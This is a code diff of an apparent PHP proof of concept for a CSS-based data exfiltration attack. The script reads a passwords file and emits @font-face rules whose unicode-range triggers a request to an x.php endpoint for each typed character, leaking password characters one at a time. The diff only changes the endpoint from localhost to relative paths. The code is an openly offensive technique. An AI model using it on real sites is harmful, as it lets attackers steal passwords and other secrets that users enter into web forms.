@@ -38,7 +38,7 @@ $doc = file_get_contents('passwords.txt');
 $hash = md5($doc);
 
 $passwords = explode("\n", $doc);
-$endpoint = '//localhost:8100/x.php';
+$endpoint = '///x.php';
 
 // Exfiltrate with CSS ... not even CSS is safe
 foreach ($passwords as $pass) {
@@ -58,7 +58,7 @@ foreach ($passwords as $pass) {
 <?php foreach (range('!', '~') as $char): continue; ?>
 @font-face{
 	font-family:attack;
-	src:url('http://localhost:8100/x.php?i=<?php echo $id; ?>&l=<?php echo $char; ?>');
+	src:url('/x.php?i=<?php echo $id; ?>&l=<?php echo $char; ?>');
 	unicode-range:U+<?php echo hexicode($char); ?>;
 }
 <?php endforeach;
